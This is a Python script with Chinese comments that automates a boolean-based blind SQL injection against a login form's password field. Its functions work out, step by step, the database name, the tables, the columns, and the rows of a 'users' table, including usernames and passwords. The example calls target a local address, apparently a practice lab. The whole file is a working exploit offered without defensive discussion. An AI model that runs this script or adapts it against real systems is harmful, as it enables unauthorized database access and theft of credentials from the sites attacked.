import requests
import json
import time

# 小写字母（ASCII码从97到122）  
lowercase_letters = [chr(i) for i in range(97, 123)]  
# 大写字母（ASCII码从65到90）  
uppercase_letters = [chr(i) for i in range(65, 91)]  
# 数字0-9（ASCII码从48到57）  
digits = [chr(i) for i in range(48, 58)]  
# 合并所有到一个列表中  
combined_list = lowercase_letters + uppercase_letters + digits 

def GetDatabaseLenth(url):
    for i in range(1, 100):
        payload = f'123456abc\' and length(database())={i} and \'1\' = \'1'
        d = {'username': 'mike', 'password': payload}
        r = requests.post(url, data = d)

        resp = json.loads(r.text)
        print(resp)
        if resp['code'] == 0:
            print("数据库长度为 ", i)
            break
        time.sleep(0.1)

# 调用GetDatabaseLenth，获取当前数据库名的长度
# url = "http://127.0.0.1:8080/search"
# GetDatabaseLenth(url)

def GetDatabaseName(url, length):
    res = ''
    for i in range(1, length+1):
        for j in combined_list:
            payload = f'123456abc\' and substr(database(),{i},1)=\'{j}\' and \'1\' = \'1'
            print(payload)
            d = {'username': 'mike', 'password': payload}
            r = requests.post(url, data = d)

            resp = json.loads(r.text)
            print(resp)
            if resp['code'] == 0:
                print("数据库名的第", i, "个字符为", j)
                res += j
                break
            time.sleep(0.1)
    print("数据库名为", res)

# 调用GetDatabaseName，获取当前数据库名
# url = "http://127.0.0.1:8080/search"
# length = 4
# GetDatabaseName(url, length)

def GetTableCount(url):
    for i in range(100):
        payload = f'123456abc\' and (select COUNT(*) from information_schema.tables where table_schema=database())={i} and \'1\' = \'1'
        d = {'username': 'mike', 'password': payload}
        r = requests.post(url, data = d)

        resp = json.loads(r.text)
        print(resp)
        if resp['code'] == 0:
            print("数据表的个数为 ", i)
            break
        time.sleep(0.1)

# 调用GetTableCount，获取当前数据库的表数量
# url = "http://127.0.0.1:8080/search"
# GetTableCount(url)

def GetTableLenth(url, cnt):
    for i in range(cnt):
        for j in range(1, 100):
            payload = f'123456abc\' and (select length(table_name) from information_schema.tables where table_schema=database() limit {i},1)={j} and \'1\' = \'1'
            d = {'username': 'mike', 'password': payload}
            r = requests.post(url, data = d)

            resp = json.loads(r.text)
            print(resp)
            if resp['code'] == 0:
                print("第", i, "个表的大小为 ", j)
                break
            time.sleep(0.1)

# 调用GetTableLenth，获取当前数据库的各个表的长度
# url = "http://127.0.0.1:8080/search"
# GetTableLenth(url, 2)

def GetTableName(url, length):
    res = []
    for i, v in enumerate(length):
        str = ''
        for j in range(1, v+1):
            for k in combined_list:
                payload = f'123456abc\' and substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{j},1)=\'{k}\' and \'1\' = \'1'
                print(payload)
                d = {'username': 'mike', 'password': payload}
                r = requests.post(url, data = d)

                resp = json.loads(r.text)
                print(resp)
                if resp['code'] == 0:
                    print("数据表的第", i, "个表的第", j, "字符为", k)
                    str += k
                    break
                time.sleep(0.1)
        res.append(str)
    print("当前所在数据库的数据表名为")
    for i in res:
        print(i)

# 调用GetTableName，获取当前数据库的各个表名
# url = "http://127.0.0.1:8080/search"
# length = [8, 5]
# GetTableName(url, length)

def GetColumnCnt(url, tablenames):
    for i, v in enumerate(tablenames):
        for j in range(1, 100):
            payload = f'123456abc\' and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name=\'{v}\')={j} and \'1\' = \'1'
            d = {'username': 'mike', 'password': payload}
            r = requests.post(url, data = d)

            resp = json.loads(r.text)
            print(resp)
            if resp['code'] == 0:
                print("第", i, "个数据库的表的列数为 ", j)
                break
            time.sleep(0.1)

# 调用GetColumnCount，获取当前数据库的某个表的列数
# url = "http://127.0.0.1:8080/search"
# tablenames = ['students', 'users']
# GetColumnCnt(url, tablenames)

def GetColumnLength(url, tablenames, cnts):
    res = []
    for i, v in enumerate(tablenames):
        partres = []
        for j in range(cnts[i]):
            for k in range(1, 100):
                payload = f'123456abc\' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=\'{v}\' limit {j},1)={k} and \'1\' = \'1'
                print(payload)
                d = {'username': 'mike', 'password': payload}
                r = requests.post(url, data = d)

                resp = json.loads(r.text)
                print(resp)
                if resp['code'] == 0:
                    print(f'数据库的第{i}个表的第{j}个列的长度为{k}')
                    partres.append(k)
                    break
                time.sleep(0.1)
        res.append(partres)
    for i, vi in enumerate(res):
        for j, vj in enumerate(vi):
            print(f'数据库的第{i}个表的第{j}个列的长度为{vj}')

# 调用GetColumnLength，获取当前数据的某个列的长度
# url = "http://127.0.0.1:8080/search"
# tablenames = ['students', 'users']
# cnts = [2, 2]
# GetColumnLength(url, tablenames, cnts)

def GetColumnName(url, tablenames, cnts, length):
    res = []
    for i, vi in enumerate(tablenames):
        partres = []
        for j in range(cnts[i]):
            str = ''
            for k in range(1, length[i][j]+1):
                for l in combined_list:
                    payload = f'123456abc\' and substr((select column_name from information_schema.columns where table_schema=database() and table_name=\'{vi}\' limit {j},1),{k},1)=\'{l}\' and \'1\' = \'1'
                    print(payload)
                    d = {'username': 'mike', 'password': payload}
                    r = requests.post(url, data = d)

                    resp = json.loads(r.text)
                    print(resp)
                    if resp['code'] == 0:
                        print(f'数据库的第{i}个表的第{j}个列的列名的第{k}个字符为{l}')
                        str += l
                        break
                    time.sleep(0.1)
            partres.append(str)
        res.append(partres)
    for i, iv in enumerate(res):
        for j, jv in enumerate(iv):
            print(f'第{i}个表的第{j}列的名为{jv}')

# 调用GetColumnName，获取当前数据表的列名
# url = "http://127.0.0.1:8080/search"
# tablenames = ['students', 'users']
# cnts = [2, 2]
# length = [[4, 3], [8, 8]]
# GetColumnName(url, tablenames, cnts, length)

def GetColumnData(url, tablename, columnnames):
    res = []
    for i in columnnames:
        partres = []
        for j in range(10): # 获取表的前10行数据
            str = ''
            for k in range(1, 10): # 获取每个数据的前10个字符（默认长度不超过10个字符）
                isend = False
                for l in combined_list:
                    payload = f'123456abc\' and substr((select {i} from {tablename} limit {j},1),{k},1)=\'{l}\' and \'1\' = \'1'
                    print(payload)
                    d = {'username': 'mike', 'password': payload}
                    r = requests.post(url, data = d)

                    resp = json.loads(r.text)
                    print(resp)
                    if resp['code'] == 0:
                        print(f'{tablename}表的{j}列的第{k}个字符为{l}')
                        str += l
                        isend = True
                        break
                    time.sleep(0.1)
                if isend == False:
                    break
            if str == '':
                break
            partres.append(str)
        print(partres)
        res.append(partres)
    print(res)

# 调用GetColumnData，获取当前数据库某一列的数据
# url = "http://127.0.0.1:8080/search"
# tablename = 'users'
# columnnames = ['username', 'password']
# GetColumnData(url, tablename, columnnames)